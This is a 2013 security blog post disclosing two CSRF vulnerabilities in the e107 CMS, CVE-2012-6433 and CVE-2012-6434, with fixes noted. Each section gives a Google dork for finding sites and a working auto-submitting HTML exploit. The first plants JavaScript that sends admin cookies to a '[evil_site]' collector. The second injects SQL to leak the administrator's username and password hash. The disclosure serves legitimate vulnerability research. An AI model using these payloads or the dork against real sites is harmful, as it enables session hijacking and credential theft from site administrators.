---
layout: post
title: e107 CSRF Vulnerabilities
date: '2013-01-01T15:11:00.002-07:00'
author: JM
tags:
- xsrf
- Web Application Security
- exploits
- web application vulnerabilities
- cross-site request forgery
- csrf
modified_time: '2013-01-14T22:15:27.568-07:00'
thumbnail: https://i.ytimg.com/vi/Qmu1qaE4WEU/default.jpg
blogger_id: tag:blogger.com,1999:blog-4063990595241430327.post-1742240923323136553
blogger_orig_url: http://www.pwnage.io/2013/01/e107-csrf-vulnerabilities.html
---

## Intro

Looks like it's time to publicly disclose these vulnerabilities. They've been discussed with the vendor, and fixes have been made. I've also grabbed CVE-IDs for each of the vulnerabilities involved. The following discussions involves my exploits, disclosures, and a demonstration video concerning the vulnerabilities.

## e107 v1.0.1 Administrator CSRF Resulting in Arbitrary Javascript Execution

```
# Exploit Title: e107 v1.0.1 Administrator CSRF Resulting in Arbitrary Javascript Execution
# Google Dork: intext:"This site is powered by e107"
# Date: 01/01/13
# Exploit Author: Joshua Reynolds
# Vendor Homepage: http://e107.org
# Software Link: http://sourceforge.net/projects/e107/files/e107/e107%20v1.0.1/e107_1.0.1_full.tar.gz/download
# Version: 1.0.1
# Tested on: BT5R1 - Ubuntu 10.04.2 LTS
# CVE: CVE-2012-6433
------------------------------------------------------------------------------------------
Description:

A Cross-Site Request Forgery vulnerability exists in the /e107_admin/newspost.php?create
function, in which an attacker can create a malicious POST request that could be sent by a
logged in e107 Administrator (upon visiting a malicious site using an iFrame known as a
drive-by attack, or other means). This is possible since e-tokens or any other request
validation is not used during this type of request. The severity of this vulnerability
increases when the Administrator has the ability to post News Items containing javascript.

This results in an attacker having the ability to force an administrator to post any arbitrary
javascript to the front page of the e107 site. Also, once posted, the resulting page:
/e107/e107_admin/newspost.php displays the new content to the Administrator, and if this
javascript is set in the news_title POST parameter, it is executed on this page in the
context of the Administrator. This results in the ability for an attacker to use any type
of javascript attack at this point in time on the Administrator through the backend news
items, and/or on the front end to any logged in user that may visit this page. What
naturally comes to mind is session hijacking through established User/Administrator cookies.
------------------------------------------------------------------------------------------
Exploit:

<html>
<body onload="document.formCSRF.submit();">
<form method="POST" name="formCSRF" action="http://[site]/e107_admin/newspost.php?create">
<input type="hidden" name="cat_id" value="1"/>
<input type="hidden" name="news_title" value="<script>location.href='http://[evil_site]/cookiemonster.php?cookie='+document.cookie;</script>"
<input type="hidden" name="news_summary" value=""/>
<input type="hidden" name="data" value=""/>
<input type="hidden" name="news" value=""/>
<input type="hidden" name="sizeselect" value=""/>
<input type="hidden" name="preimageselect" value=""/>
<input type="hidden" name="news_extended" value=""/>
<input type="hidden" name="extended" value=""/>
<input type="hidden" name="sizeselect" value=""/>
<input type="hidden" name="preimageselect" value=""/>
<input type="hidden" name="file_userfile[]" value=""/>
<input type="hidden" name="uploadtype[]" value="resize"/>
<input type="hidden" name="resize_value" value="100"/>
<input type="hidden" name="news_allow_comments" value="0"/>
<input type="hidden" name="news_rendertype" value="0"/>
<input type="hidden" name="news_start" value=""/>
<input type="hidden" name="news_end" value=""/>
<input type="hidden" name="news_datestamp" value=""/>
<input type="hidden" name="news_userclass[0]" value="1"/>
<input type="hidden" name="news_author" value="1"/>
<input type="hidden" name="submit_news" value="Post news to database"/>
<input type="hidden" name="news_id" value=""/>
</form>
</body>
</html>
------------------------------------------------------------------------------------------
Fix:

The bug has been fixed in the following revision: r12992
Upgrade to v1.0.2
------------------------------------------------------------------------------------------
Shout outs: Red Hat Security Team, Ms. Umer, Dr. Wu, Tim Williams, friends, & family.

Contact:
Mail: infosec4breakfast@gmail.com
Blog: infosec4breakfast.com
Twitter: @jershmagersh
Youtube: youtube.com/user/infosec4breakfast
```

## e107 v1.0.2 Administrator CSRF Resulting in SQL Injection

```
# Exploit Title: e107 v1.0.2 Administrator CSRF Resulting in SQL Injection
# Google Dork: intext:"This site is powered by e107"
# Date: 01/01/13
# Exploit Author: Joshua Reynolds
# Vendor Homepage: http://e107.org
# Software Link: http://sourceforge.net/projects/e107/files/e107/e107%20v1.0.2/e107_1.0.2_full.tar.gz/download
# Version: 1.0.2
# Tested on: BT5R1 - Ubuntu 10.04.2 LTS
# CVE: CVE-2012-6434
-----------------------------------------------------------------------------------------
Description:

Cross-Site Request Forgery vulnerability in the e107_admin/download.php page, which is also vulnerable to SQL injection in the POST form. The e-token or ac tokens are not used in this page, which results in the CSRF vulnerability. This in itself is not a major security vulnerability but when done in conjunction with a SQL injection attack it can result in complete information disclosure.

The parameters which are vulnerable to SQL injection on this page include: download_url, download_url_extended, download_author_email, download_author_website, download_image, download_thumb, download_visible, download_class.

The following is an exploit containing javascript code that submits a POST request on behalf of the administrator once the page is visited. It contains a SQL injection that would provide the username and password (in MD5) of the administrator to be added to the Author Name of a publicly available download.
------------------------------------------------------------------------------------------
Exploit:

<html>
<body onload="document.formCSRF.submit();">
<form method="POST" name="formCSRF" action="http://[site]/e107/e107102/e107_admin/download.php?create">
<input type="hidden" name="cat_id" value="1"/>
<input type="hidden" name="download_category" value="2"/>
<input type="hidden" name="download_name" value="adminpassdownload"/>
<input type="hidden" name="download_url" value="test.txt', (select concat(user_loginname,'::',user_password) from e107_user where user_id = '1'), '', '', '', '', '0', '2', '2', '1352526286', '', '', '2', '0', '', '0', '0' ) -- -"/>
<input type="hidden" name="download_url_external" value=""/>
<input type="hidden" name="download_filesize_external" value=""/>
<input type="hidden" name="download_filesize_unit" value="KB"/>
<input type="hidden" name="download_author" value=""/>
<input type="hidden" name="download_author_email" value=""/>
<input type="hidden" name="download_author_website" value=""/>
<input type="hidden" name="download_description" value=""/>
<input type="hidden" name="download_image" value=""/>
<input type="hidden" name="download_thumb" value=""/>
<input type="hidden" name="download_datestamp" value=""/>
<input type="hidden" name="download_active" value="1"/>
<input type="hidden" name="download_datestamp" value="10%2F11%2f2012+02%3A47%3A47%3A28"/>
<input type="hidden" name="download_comment" value="1"/>
<input type="hidden" name="download_visible" value="0"/>
<input type="hidden" name="download_class" value="0"/>
<input type="hidden" name="submit_download" value="Submit+Download"/>
</form>
</body>
</html>
------------------------------------------------------------------------------------------
Fix:

This bug has been fixed in the following revision: r13058
------------------------------------------------------------------------------------------
Shout outs: Red Hat Security Team, Ms. Umer, Dr. Wu, Tim Williams, friends, & family.

Contact:
Mail: infosec4breakfast@gmail.com
Blog: infosec4breakfast.com
Twitter: @jershmagersh
Youtube: youtube.com/user/infosec4breakfast
```

## Video

{% include youtube.html id="Qmu1qaE4WEU" width="100%" %}
